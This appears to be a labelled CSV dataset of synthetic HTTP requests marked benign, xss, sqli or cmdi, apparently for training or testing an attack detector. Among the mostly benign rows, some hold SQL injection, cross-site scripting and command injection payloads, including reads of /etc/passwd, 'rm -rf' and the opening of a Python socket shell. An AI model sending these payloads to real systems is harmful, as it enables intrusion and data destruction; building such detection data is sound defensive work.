method,url,headers,body,label
GET,/api/v2/orders/66669/items?max=17886&page=21&sort=relevance,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""referer"": ""https://example.com/dashboard/apps/54153/metrics""}",,benign
GET,/apps/app-79979/dashboard?id=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
DELETE,/api/apps/47004/deploy?max=66709,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
DELETE,/blog/2025/cafe-headphones,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/items/74161"", ""x-forwarded-for"": ""10.244.39.149""}",,benign
GET,/admin/settings/security,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/apps/67220/api/v1/items""}",,benign
GET,/apps/app-43245/dashboard?q=group by category,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.229.200.94""}",,benign
PUT,/apps/49575?brand=philips&lang=de,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""name"": ""dog"", ""email"": ""howto"", ""username"": ""camera""}",benign
DELETE,/blog/2022/food-kubernetes?limit=64&max=77787&sort=rating&id=%24%28cat%20%2Fetc%2Fhosts%29,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""referer"": ""https://example.com/register""}",,cmdi
DELETE,/api/v2/orders/85847/items?min=2701&format=json,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.26.158.162""}",,benign
GET,/apps/11062?q=eval your options before buying,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
GET,/api/v1/users/84395/profile?lang=ja&category=toys,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.19.114.87""}",,benign
POST,/account/preferences?ref=email&sort=rating&brand=philips,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""value"": ""typescript"", ""name"": ""book"", ""comment"": ""`whoami`""}",cmdi
GET,/search,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/v1/users/94844/profile""}",,benign
DELETE,/checkout/cart?ref=email&format=json&lang=es&brand=purina,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/blog/2024/cat-headphones-flat-howto?category=furniture&max=45557,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
DELETE,/docs/smoothie-linux-guide?limit=37&sort=popularity,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
PUT,/login?page=45&sort=rating&ref=homepage,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register""}","{""category"": ""linux"", ""quantity"": ""155""}",benign
PUT,/items/32013?page=31,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.244.219.176""}","{""description"": ""project"", ""value"": ""diner"", ""name"": ""| id;uname -a""}",cmdi
DELETE,/search?format=xml&filter=rust,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}",,benign
GET,"/register?max=19234&lang=ja&brand=lenovo&id=1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--","{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json""}",,sqli
DELETE,/api/v2/orders/85747/items?q=cat&lang=es,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/app-29359/dashboard""}",,benign
DELETE,/login?page=5&format=json,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json""}",,benign
POST,/products/41580/reviews?page=29&filter=resume&format=json&limit=96,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.120.202.252""}","{""email"": ""dress"", ""quantity"": ""74"", ""description"": ""terraform"", ""title"": ""kubernetes""}",benign
DELETE,/products/63288/reviews?sort=price_asc&brand=sony&lang=ja,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json""}",,benign
DELETE,/items/36574?min=809,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*""}",,benign
GET,/search?max=13235,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/api/v2/orders/76109/items?id=' OR 1=1; DROP TABLE users--,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,sqli
GET,/search?max=price%20%3E%20100%20%26%20%3C%20500,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/login""}",,benign
PUT,/api/apps/36843/deploy?limit=69,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""price"": ""202"", ""description"": ""salad"", ""value"": ""laptop"", ""title"": ""juice"", ""username"": ""resume""}",benign
DELETE,/apps/38538?offset=416&page=33,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/v1/users/8996/profile""}",,benign
PUT,/docs/biography-pet-magazine-golang?input=%7C%20id%3Buname%20-a,"{""user-agent"": ""| id;uname -a"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/checkout/cart""}","{""email"": ""rust"", ""price"": ""249"", ""title"": ""howto""}",cmdi
DELETE,/apps/2378/api/v1/items?max=87794&q=%7C%20%2Fbin%2Fbash%20-c%20%27id%27,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json""}",,cmdi
PUT,/docs/guide-diner?page=38&ref=social&q=`whoami`,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""email"": ""keyboard"", ""description"": ""juice"", ""value"": ""howto""}",cmdi
GET,/items/10900?search=1' WAITFOR DELAY '0:0:5'--,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/docs/obrien-biography""}",,sqli
PUT,/search?max=54116&lang=ja&search=; rm -rf /tmp/test,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.249.131.153""}","{""category"": ""ring"", ""title"": ""howto""}",cmdi
PUT,/checkout/cart?q=juice&filter=headphones&limit=21&input=' OR 1=1 LIMIT 1--,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""value"": ""smoothie"", ""price"": ""112"", ""quantity"": ""18"", ""description"": ""diner""}",sqli
GET,/api/v2/orders/5202/items?brand=acer&ref=email,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
PUT,/checkout/cart?lang=ja&brand=whiskas,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/admin/settings/security"", ""x-forwarded-for"": ""10.8.236.70""}","{""value"": ""kubernetes"", ""category"": ""cafe"", ""quantity"": ""212"", ""username"": ""journal"", ""email"": ""shirt""}",benign
POST,/account/preferences?filter=smoothie&category=furniture&ref=email&q=shirt,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""ring"", ""name"": ""trousers""}",benign
DELETE,/api/apps/4404/deploy?min=2570,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,benign
PUT,/login?lang=de&brand=apple,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.249.17.95""}","{""name"": ""jacket"", ""title"": ""portfolio"", ""description"": ""cafe""}",benign
PUT,/categories/toys/products?lang=es&ref=email&offset=290,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""laptop"", ""email"": ""pizza"", ""quantity"": ""305"", ""name"": ""bag""}",benign
PUT,/api/apps/46357/deploy?format=csv&page=Tom's Diner restaurant,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""email"": ""camera"", ""price"": ""65""}",benign
DELETE,/api/v2/orders/72217/items,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/app-11001/dashboard""}",,benign
DELETE,/apps/app-16275/dashboard?filter=biography&brand=lg&search=<details open ontoggle=alert(1)>,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,xss
GET,/categories/books/products?lang=ja&filter=obrien&page=10&brand=lg,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""referer"": ""https://example.com/apps/27840""}",,benign
DELETE,/checkout/cart?min=1061&sort=price_asc&input=%3B%20python3%20-c%20%27import%20socket%2Csubprocess%3Bs%3Dsocket.socket%28%29%27,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json""}",,cmdi
DELETE,/dashboard/apps/71551/metrics?page=18&q=diner,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*""}",,benign
PUT,/login?page=33&min=3456,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""quantity"": ""189"", ""name"": ""novel"", ""username"": ""smoothie""}",benign
POST,/docs/dog-villa-tea-apartment?brand=asus&category=clothing,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""description"": ""salad"", ""title"": ""journal"", ""name"": ""laptop"", ""value"": ""smoothie""}",benign
GET,/register,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/products/77414/reviews""}",,benign
POST,/apps/88319/api/v1/items?q=bag&limit=77&offset=51&page=30,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/account/preferences""}","{""value"": ""tutorial"", ""name"": ""pet""}",benign
GET,/account/preferences?id=1%27%20AND%201%3DCONVERT%28int%2C%20%28SELECT%20TOP%201%20name%20FROM%20sysobjects%29%29--,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*""}",,sqli
DELETE,/account/preferences?search=expression%28alert%281%29%29,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/items/67928"", ""x-forwarded-for"": ""10.123.146.93""}",,xss
POST,/checkout/cart?category=food&offset=263&filter=guide&search=%3Csvg%20onload%3Dalert%281%29%3E,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""username"": ""pizza"", ""email"": ""ring"", ""name"": ""shirt"", ""quantity"": ""189"", ""value"": ""linux""}",xss
DELETE,/register?ref=homepage,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,benign
GET,/apps/app-80268/dashboard?q=diner&min=276,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/apps/21097/api/v1/items""}",,benign
POST,/api/v2/orders/30400/items?sort=price_desc&offset=471&brand=purina,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""127.0.0.1\ncat /etc/passwd"", ""description"": ""studio""}",cmdi
GET,/account/preferences?ref=email&filter=laptop&offset=38,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/apps/app-74277/dashboard""}",,benign
POST,/blog/2023/coffee-journal-electronics-juice?min=4321&limit=26,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/17583/api/v1/items""}","{""price"": ""150"", ""email"": ""apartment"", ""username"": ""portfolio""}",benign
DELETE,/apps/app-38233/dashboard?limit=31&format=xml&sort=price_asc,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/96793/items""}",,benign
PUT,/login?limit=93&q=order%20by%20date%20asc,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/project-coffee-howto-cat""}","{""price"": ""96"", ""description"": ""project"", ""title"": ""project"", ""username"": ""juice""}",benign
POST,/apps/95565?q=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a),"{""user-agent"": ""1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""biography"", ""email"": ""docker"", ""price"": ""443"", ""username"": ""dog""}",sqli
DELETE,/dashboard/apps/8148/metrics?q=<object data=javascript:alert(1)>,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*""}",,xss
PUT,/search?max=89957,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""category"": ""monitor"", ""value"": ""ubuntu"", ""title"": ""shirt"", ""quantity"": ""59""}",benign
GET,/apps/58934?page=33&brand=samsung&format=csv,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/apps/30275/api/v1/items""}",,benign
DELETE,/apps/10662/api/v1/items?brand=whiskas&max=81750&limit=16&sort=relevance,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.183.68.132""}",,benign
PUT,/apps/12673?q=how to drop table weight effectively&format=csv&max=99425,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/apps/96177/api/v1/items"", ""x-forwarded-for"": ""10.105.88.248""}","{""name"": ""juice"", ""category"": ""dress"", ""quantity"": ""351""}",benign
GET,/register?ref=social,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
POST,/search?max=63218,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v2/orders/18650/items""}","{""price"": ""487"", ""name"": ""ring"", ""category"": ""textbook""}",benign
POST,/apps/app-90205/dashboard?q=headphones&min=exec%20chef%20meal%20prep%20service&category=clothing,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""value"": ""smoothie"", ""email"": ""studio"", ""description"": ""monitor""}",benign
GET,/api/apps/33051/deploy?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/admin/settings/security""}",,xss
DELETE,/blog/2025/docker-kubernetes-golang-dog?limit=73&ref=homepage&id=<object data=javascript:alert(1)>,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/v2/orders/55422/items""}",,xss
GET,/items/22017?q=resume&category=exec chef meal prep service,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/account/preferences""}",,benign
PUT,/api/apps/70444/deploy,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/api/v1/users/66380/profile""}","{""name"": ""novel"", ""title"": ""monitor"", ""value"": ""electronics"", ""category"": ""magazine"", ""price"": ""463""}",benign
